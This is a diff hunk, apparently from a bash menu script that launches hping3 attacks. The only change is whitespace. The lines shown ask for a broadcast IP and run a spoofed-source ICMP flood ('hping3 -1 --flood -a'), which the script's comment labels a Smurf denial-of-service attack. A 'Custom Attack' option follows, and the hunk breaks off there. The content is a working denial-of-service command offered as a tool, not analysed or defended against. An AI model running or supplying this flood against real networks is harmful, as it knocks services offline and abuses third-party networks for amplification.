@@ -36,7 +36,7 @@ do
 	echo "Input broadcast IP"
 	read bar
 	##Smurf Attack: This is a type of denial-of-service attack that floods a target system via spoofed broadcast ping messages.
-        sudo  hping3 -1 --flood -a $foo1 $bar
+        sudo hping3 -1 --flood -a $foo1 $bar
             ;;
     "Custom Attack")
     echo "Input your hping3 arguments" 
